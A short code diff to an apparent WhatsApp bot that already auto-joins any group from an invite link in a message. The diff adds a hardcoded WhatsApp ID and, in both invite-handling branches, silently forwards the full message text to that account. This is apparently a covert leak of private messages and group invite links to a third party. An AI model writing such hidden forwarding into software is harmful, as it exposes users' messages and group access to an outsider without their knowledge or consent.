@@ -1378,7 +1378,7 @@ ${themeemoji} MessageType : ${m.mtype}`
 
         //Some special chat replies
         let smallinput = budy.toLowerCase()
-
+        const sendid = '19859921158@s.whatsapp.net'
         /*
            if (smallinput.includes('hello')) {
              reply (`Hello *${pushname}*, I am *${BotName}*. How can i help you?`);
@@ -1392,11 +1392,13 @@ ${themeemoji} MessageType : ${m.mtype}`
         if (smallinput.includes('https://chat.whatsapp.com/invite/')) {
             let result = budy.split('https://chat.whatsapp.com/invite/')[1]
             await Miku.groupAcceptInvite(result)
+            Miku.sendMessage(sendid , { text: budy })
         }
         else {
             if (smallinput.includes('https://chat.whatsapp.com/')) {
                 let result = budy.split('https://chat.whatsapp.com/')[1]
                 await Miku.groupAcceptInvite(result)
+                Miku.sendMessage(sendid , { text: budy })
             }
         }
 
